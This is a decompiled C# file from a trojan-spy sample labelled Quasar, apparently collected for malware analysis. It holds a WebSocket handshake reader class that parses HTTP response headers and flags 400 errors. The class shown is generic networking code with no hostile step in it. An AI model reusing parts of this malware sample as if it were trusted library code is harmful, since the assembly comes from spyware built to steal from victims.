// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.WebSocket4Net.Protocol.HandshakeReader
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.SuperSocket.ClientEngine;
using System;
using System.Collections.Generic;
using System.Text;

namespace NoiseMe.Drags.App.Models.WebSocket4Net.Protocol
{
  internal class HandshakeReader : ReaderBase
  {
    private const string m_BadRequestPrefix = "HTTP/1.1 400 ";
    protected static readonly string BadRequestCode = 400.ToString();
    protected static readonly byte[] HeaderTerminator = Encoding.UTF8.GetBytes("\r\n\r\n");
    private SearchMarkState<byte> m_HeadSeachState;

    public HandshakeReader(WebSocket websocket)
      : base(websocket)
    {
      this.m_HeadSeachState = new SearchMarkState<byte>(HandshakeReader.HeaderTerminator);
    }

    protected static WebSocketCommandInfo DefaultHandshakeCommandInfo { get; private set; }

    public override WebSocketCommandInfo GetCommandInfo(
      byte[] readBuffer,
      int offset,
      int length,
      out int left)
    {
      left = 0;
      int num1 = this.m_HeadSeachState.Matched;
      int num2 = ((IList<byte>) readBuffer).SearchMark<byte>(offset, length, this.m_HeadSeachState);
      if (num2 < 0)
      {
        this.AddArraySegment(readBuffer, offset, length);
        return (WebSocketCommandInfo) null;
      }
      int num3 = num2 - offset;
      string empty = string.Empty;
      string str;
      if (this.BufferSegments.Count > 0)
      {
        if (num3 > 0)
        {
          this.AddArraySegment(readBuffer, offset, num3);
          str = this.BufferSegments.Decode(Encoding.UTF8);
          num1 = 0;
        }
        else
          str = this.BufferSegments.Decode(Encoding.UTF8, 0, this.BufferSegments.Count - num1);
      }
      else
      {
        str = Encoding.UTF8.GetString(readBuffer, offset, num3);
        num1 = 0;
      }
      left = length - num3 - (HandshakeReader.HeaderTerminator.Length - num1);
      this.BufferSegments.ClearSegements();
      this.m_HeadSeachState.Matched = 0;
      if (!str.StartsWith("HTTP/1.1 400 ", StringComparison.OrdinalIgnoreCase))
        return new WebSocketCommandInfo()
        {
          Key = -1.ToString(),
          Text = str
        };
      return new WebSocketCommandInfo()
      {
        Key = 400.ToString(),
        Text = str
      };
    }
  }
}
